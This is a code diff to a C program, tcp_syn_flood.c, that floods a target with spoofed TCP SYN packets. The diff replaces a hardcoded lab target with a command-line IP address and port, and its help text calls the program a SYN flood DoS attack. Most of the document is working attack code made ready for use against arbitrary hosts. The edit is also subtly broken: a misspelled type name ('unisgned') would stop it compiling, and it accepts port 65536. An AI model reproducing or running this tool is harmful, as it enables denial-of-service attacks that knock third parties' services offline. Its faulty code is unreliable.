@@ -1,3 +1,8 @@
+/* tcp_syn_flood.c
+ * written by adamalston, edited by GiwbyAlbatross 2020 and 2026, respectively
+ * usage: tcp_syn_flood TARGET_PORT TARGET_IP
+ */
+
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,8 +13,6 @@
 #include <arpa/inet.h>
 #include "header.h"
 
-#define DEST_IP "10.0.2.69"
-#define DEST_PORT 80 // Attack the web server
 #define PACKET_LEN 1500
 
 unsigned short calculate_tcp_checksum(struct ipheader *ip);
@@ -36,9 +39,26 @@ void send_raw_ip_packet(struct ipheader *ip)
 }
 
 // Spoof a TCP SYN packet.
-int main()
+int main(int argc, char ** argv)
 {
     char buffer[PACKET_LEN];
+
+    // "sanity check" of arguments + help message
+    if (argc != 3) {
+        printf("%s: conduct a SYN flood DoS attack (see https://github.com/adamalston/SYN-Flood/blob/master/README.md)\nARGUMENTS:\n\t%s TARGET_PORT TARGET_IP\n", argv[0], argv[0]);
+        return 0;
+    }
+    
+    char * dest_ip = argv[2];
+    unisgned short int port;
+    char * errstr;
+
+    port = strtonum(argv[1], 1, 65536, &errstr);
+    if (errstr != NULL) {
+        printf("%s: error parsing port specification :'%s'", argv[0], errstr);
+        return 2;
+    }
+    
     struct ipheader *ip = (struct ipheader *)buffer;
     struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
 
@@ -49,7 +69,7 @@ int main()
         memset(buffer, 0, PACKET_LEN);
         // Step 1: Fill in the TCP header.
         tcp->tcp_sport = rand(); 			// Use random source port
-        tcp->tcp_dport = htons(DEST_PORT);
+        tcp->tcp_dport = htons(port);
         tcp->tcp_seq = rand(); 				// Use random sequence #
         tcp->tcp_offx2 = 0x50;
         tcp->tcp_flags = TH_SYN; 			// Enable the SYN bit
@@ -61,7 +81,7 @@ int main()
         ip->iph_ihl = 5;					// Header length
         ip->iph_ttl = 50;					// Time to live
         ip->iph_sourceip.s_addr = rand();	// Use a random IP address
-        ip->iph_destip.s_addr = inet_addr(DEST_IP);
+        ip->iph_destip.s_addr = inet_addr(dest_ip);
         ip->iph_protocol = IPPROTO_TCP; 	// The value is 6.
         ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
 
